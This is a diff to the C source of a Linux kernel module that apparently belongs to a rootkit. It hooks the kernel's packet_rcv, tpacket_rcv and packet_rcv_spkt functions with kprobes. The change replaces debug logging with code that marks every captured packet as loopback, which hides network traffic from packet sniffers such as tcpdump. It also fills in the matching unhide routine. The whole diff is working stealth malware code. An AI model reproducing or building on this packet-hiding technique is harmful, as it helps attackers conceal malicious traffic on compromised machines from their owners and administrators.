@@ -12,6 +12,7 @@ static int g7_packet_rcv_spkt(struct kprobe *, struct pt_regs *);
 static int g7_fault(struct kprobe *, struct pt_regs *, int);
 static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);
 
+//TODO store in array of kprobes
 static struct kprobe p_rcv = {
     .symbol_name    = "packet_rcv",
 };
@@ -50,6 +51,8 @@ void
 unhide_packets(void)
 {
     unregister_kprobe(&p_rcv);
+    unregister_kprobe(&tp_rcv);
+    unregister_kprobe(&p_rcv_spkt);
 }
 
 static int
@@ -58,7 +61,7 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     struct sk_buff *skb;
     skb = (struct sk_buff *)pt_regs->di;
 
-    DEBUG_INFO("[p_rcv] proto is %0X\n", skb->protocol);
+    skb->pkt_type = PACKET_LOOPBACK;
     
 
     return 0;
@@ -70,7 +73,7 @@ g7_tpacket_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     struct sk_buff *skb;
     skb = (struct sk_buff *)pt_regs->di;
 
-    DEBUG_INFO("[tp_rcv] proto is %0X\n", skb->protocol);
+    skb->pkt_type = PACKET_LOOPBACK;
 
     return 0;
 }
@@ -80,7 +83,7 @@ static int g7_packet_rcv_spkt(struct kprobe *kp, struct pt_regs *pt_regs)
     struct sk_buff *skb;
     skb = (struct sk_buff *)pt_regs->di;
 
-    DEBUG_INFO("[tp_rcv] proto is %0X\n", skb->protocol);
+    skb->pkt_type = PACKET_LOOPBACK;
 
     return 0;
 }
